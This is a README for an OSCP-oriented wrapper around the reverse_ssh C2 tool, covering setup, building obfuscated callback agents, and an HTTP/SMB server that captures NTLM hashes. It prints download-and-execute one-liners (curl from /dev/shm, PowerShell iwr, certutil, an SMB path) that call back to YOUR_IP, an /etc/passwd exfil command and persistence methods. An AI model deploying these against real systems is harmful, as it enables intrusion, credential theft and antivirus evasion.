# OSCP NHAS Reverse SSH Server

> Wrapper toolkit around [NHAS/reverse_ssh](https://github.com/NHAS/reverse_ssh) — automated setup, cross-platform agent builds, and integrated HTTP + SMB file serving in a single terminal.

**For authorized penetration testing and lab environments only.**

---

## What This Is

`reverse_ssh` turns SSH into a reverse shell C2. Targets run a small client binary that calls back to your server over SSH. You then SSH into those sessions from the catcher console. This repo wraps that tool with:

- One-shot setup (`setup-nhas.sh`) — installs dependencies, generates keys, builds the server
- Cross-platform agent builder (`nhas-build.sh`) — compiles 20+ client variants for Linux/Windows/macOS/ARM in one go
- Launch dashboard (`nhas-start.sh`) — shows all agent commands, persistence tricks, and SMB/HTTP download one-liners, then starts the server
- Integrated file server (`nhas-tools.sh` + `tools.py`) — HTTP upload/download + SMB share started automatically alongside NHAS, no second terminal needed

---

## Repository Structure

```
OSCP-nhas-ssh-server/
├── setup-nhas.sh        # First-time setup: deps, keys, server binary
├── nhas-build.sh        # Build all client variants (20+ binaries)
├── nhas-start.sh        # Launch dashboard + server (nhasup alias)
├── nhas-tools.sh        # Thin launcher for tools.py (HTTP + SMB)
├── tools.py             # DualServe file transfer server
├── setup-tools.sh       # Install tools.py dependencies
│
├── bin/                 # Created by setup
│   ├── server           # NHAS server binary
│   ├── id_ed25519       # Server host key (fingerprint baked into clients)
│   ├── authorized_keys          # SSH keys allowed to access catcher console
│   ├── authorized_controllee_keys  # Client embed keypair public key
│   └── exploits/        # Built client binaries served by the file server
│
└── internal/client/keys/
    ├── private_key      # Client embed keypair (compiled into every agent)
    └── private_key.pub
```

---

## Quick Start

### 1. Setup (once)

```bash
git clone https://github.com/1337codes/OSCP-nhas-ssh-server
cd OSCP-nhas-ssh-server

# Install tools.py dependencies first
bash setup-tools.sh

# Then set up NHAS (installs Go, UPX, generates keys, builds server)
sudo bash setup-nhas.sh

# Source your shell to pick up ~/go/bin (garble, etc.)
source ~/.zshrc   # or ~/.bashrc
```

### 2. Build agents (once per new IP)

```bash
bash nhas-build.sh
# Enter your tun0 IP and callback port when prompted
# Outputs 20+ binaries to bin/exploits/
```

### 3. Start everything

```bash
nhasup          # uses the alias set by setup-nhas.sh
# or:
bash nhas-start.sh
```

This starts:
- NHAS reverse SSH server on `:3232`
- HTTP file server (tools.py) on your chosen port (default `:80`)
- SMB share `\\YOUR_IP\evil` on `:445` pointing at `bin/exploits/`

---

## Detailed Usage

### Connecting

From your Kali terminal, open the catcher console:

```bash
ssh rssh
```

Inside the catcher, list connected clients and jump to one:

```bash
ls -t                         # list clients, newest first
ssh -J rssh <client-id>       # Linux target
ssh -tt -J rssh <client-id>   # Windows target (always -tt)
```

Port forward and proxy:

```bash
ssh -L 8080:127.0.0.1:80 -J rssh <id>    # local port forward
ssh -D 9050 -J rssh <id>                 # SOCKS5 proxy via target
scp -J rssh <id>:/etc/passwd .           # file exfil
```

### Agent Types

| Type | Description | Use when |
|------|-------------|----------|
| `Direct` | Callback IP:PORT compiled in, no args needed | You know the target can reach your IP |
| `Non-direct` | Requires `-d IP:PORT` at runtime | Flexible, reuse binary across engagements |
| `Compressed` | UPX-packed, ~60% smaller | Size-constrained uploads |
| `Obfuscated` | Built with garble, symbol names randomized | AV evasion |

### Deploying Agents

`nhas-start.sh` prints ready-to-paste one-liners for every scenario. A few examples:

**Linux (fileless from /dev/shm):**
```bash
f=/dev/shm/.$$;curl -so $f http://YOUR_IP:PORT/nhasLinuxAmd64&&chmod +x $f&&$f -d YOUR_IP:3232;rm -f $f
```

**Windows (PowerShell IWR):**
```powershell
iwr -Uri 'http://YOUR_IP:PORT/nhasWinAmd64.exe' -OutFile .\nhas.exe; .\nhas.exe -d YOUR_IP:3232
```

**Windows (SMB fileless, no disk write):**
```
\\YOUR_IP\evil\nhasWinAmd64.exe -d YOUR_IP:3232
```

**Windows (certutil, no PowerShell):**
```
certutil -urlcache -split -f http://YOUR_IP:PORT/nhasWinAmd64.exe nhas.exe && nhas.exe -d YOUR_IP:3232
```

---

## Scripts

### `setup-nhas.sh`

Run once as root. Does everything needed before a build:

- Installs Go (≥1.21), UPX, git via your package manager (apt / pacman / dnf / zypper)
- Clones `NHAS/reverse_ssh` source into the workspace
- Builds `bin/server`
- Generates `bin/id_ed25519` (server host key — fingerprint baked into every client at build time)
- Generates `internal/client/keys/private_key` (client embed keypair — compiled into agents)
- Installs `garble` for obfuscated builds
- Adds `nhasup` alias and `~/go/bin` to PATH
- Configures `~/.ssh/config` with `Host rssh → localhost:3232`

### `nhas-build.sh`

Compiles all client variants. Prompts for callback IP and port, then builds:

| Platform | Variants |
|----------|---------|
| Linux x64 | Direct, Direct+UPX, plain, plain+UPX, Obfuscated Direct, Obfuscated Direct+UPX, Obfuscated |
| Linux x86 | Direct, plain |
| Linux ARM64/v7/v6 | Direct, plain |
| Windows x64 | Direct, Direct+UPX, plain, plain+UPX, Obfuscated Direct, Obfuscated Direct+UPX, Obfuscated |
| Windows x86 | Direct, plain |
| macOS x64/ARM64 | Direct, plain |

Key: `RSSH_FINGERPRINT` (the server's `bin/id_ed25519` SHA256 in hex) is automatically read and exported so every client verifies the server identity on connect.

### `nhas-start.sh`

The main launch script. Prompts for interface, ports, and agent names, then prints:

- Agent summary (what's built, sizes)
- Configuration block
- Quick-build commands for direct agents
- Auto-builds `nhasLinuxAmd64Direct` and `nhasWinAmd64Direct.exe` with your current IP baked in (restored to previous versions on exit)
- Every agent download command (13 Linux variants, 14 Windows variants, base64 one-liners, SMB paths)
- Persistence commands (crontab, bashrc, systemd, registry, scheduled tasks, WMI)
- Starts tools.py (HTTP+SMB) in the background
- Starts NHAS server (foreground, Ctrl+C kills everything cleanly)

### `nhas-tools.sh`

Thin wrapper around `tools.py`. Called automatically by `nhas-start.sh`.

- Finds `tools.py` next to itself, in the sibling repo, or common paths
- Falls back to `python3 -m http.server` if `tools.py` is missing
- Filters all tools.py output — only completed downloads `[DONE]`, uploads `[UP]`, failures `[FAIL]`, and captured NTLM hashes `[SMB][HASH]` appear in your terminal
- To update the file server: replace `tools.py`, this script never needs to change

Override `tools.py` location:
```bash
TOOLS_PY=/path/to/tools.py nhasup
```

### `tools.py`

[DualServe](https://github.com/1337codes/OSCP-HTTP-SMB-File-Transfer-Server) — HTTP + SMB file transfer server.

- HTTP upload (PUT/POST) and download with progress bars and MD5 verification
- SMB share via `impacket-smbserver` with NTLM hash capture
- File browser at `/files`, JSON index at `/list`
- Base64 download helper at `/b64/filename`

### `setup-tools.sh`

Installs `tools.py` dependencies on a fresh Kali:

```bash
bash setup-tools.sh
```

Handles the Python 3.13+ `cgi` module removal via `legacy-cgi` pip package.

---

## Key Management

The server and all clients use three keys:

| Key | Location | Purpose |
|-----|----------|---------|
| Server host key | `bin/id_ed25519` | Server identity. Fingerprint compiled into every client via `RSSH_FINGERPRINT`. |
| Client embed keypair | `internal/client/keys/private_key` | Compiled into every agent binary. Public key in `bin/authorized_controllee_keys`. |
| Operator SSH key | `~/.ssh/id_ed25519` | Your key for the catcher console. Public key in `bin/authorized_keys`. |

**To rotate the server key:** delete `bin/id_ed25519`, re-run `setup-nhas.sh`, then rebuild all clients. Old clients will reject the new server.

---

## Requirements

| Tool | Purpose | Installed by |
|------|---------|-------------|
| Go ≥ 1.21 | Compile clients and server | `setup-nhas.sh` |
| git | Clone NHAS source | `setup-nhas.sh` |
| UPX | Compress binaries (optional) | `setup-nhas.sh` |
| garble | Obfuscated builds (optional) | `setup-nhas.sh` |
| python3 | File server | system |
| python3-impacket | SMB server | `setup-tools.sh` |

---

## Troubleshooting

**Clients connecting but fingerprint error / immediate disconnect:**
The server key and built clients are out of sync. Re-run `setup-nhas.sh` then `nhas-build.sh`.

**`pattern private_key: no matching files found` during build:**
`internal/client/keys/private_key` is missing. Re-run `setup-nhas.sh`.

**Garble builds failing:**
```bash
go install mvdan.cc/garble@latest
source ~/.zshrc
```

**SMB not starting (port 445 in use):**
`tools.py` automatically kills the existing process on port 445. If it fails, run:
```bash
sudo fuser -k 445/tcp
```

**Downloads not appearing in terminal:**
Ensure you're using the latest `nhas-tools.sh` (includes `PYTHONUNBUFFERED=1`). Without it, Python buffers output when stdout is piped and `[DONE]` lines never appear.

**Port forward needed (callback port ≠ listen port):**
`nhas-start.sh` detects this and prints the socat forward command automatically.

---

## Credits

- [NHAS/reverse_ssh](https://github.com/NHAS/reverse_ssh) — the actual C2
- [1337codes/OSCP-HTTP-SMB-File-Transfer-Server](https://github.com/1337codes/OSCP-HTTP-SMB-File-Transfer-Server) — DualServe file transfer server
